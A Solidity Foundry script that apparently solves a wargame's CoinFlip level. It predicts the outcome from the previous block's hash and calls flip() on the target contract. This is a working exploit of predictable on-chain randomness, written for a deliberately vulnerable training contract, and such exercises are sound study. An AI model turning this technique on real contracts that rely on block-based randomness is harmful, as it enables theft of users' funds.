// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../../src/CoinFlip.sol";

contract FlipCoinFlip is Script {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    //It doesn't always manage to guess since the block.number may change before the transaction completes.
    function flipCoinFlip(address myCoinFlipContract) public {
        vm.startBroadcast();
        uint256 blockValue = (uint256(blockhash(block.number - 1))) / FACTOR;
        bool side = blockValue == 1 ? true : false;
        console.log(uint256(blockhash(block.number - 1)));
        console.log((uint256(blockhash(block.number - 1))) / FACTOR);
        console.log(side);
        CoinFlip(myCoinFlipContract).flip(side);
        vm.stopBroadcast();
    }

    function run(address myCoinFlipContract) external {
        flipCoinFlip(myCoinFlipContract);
    }
}
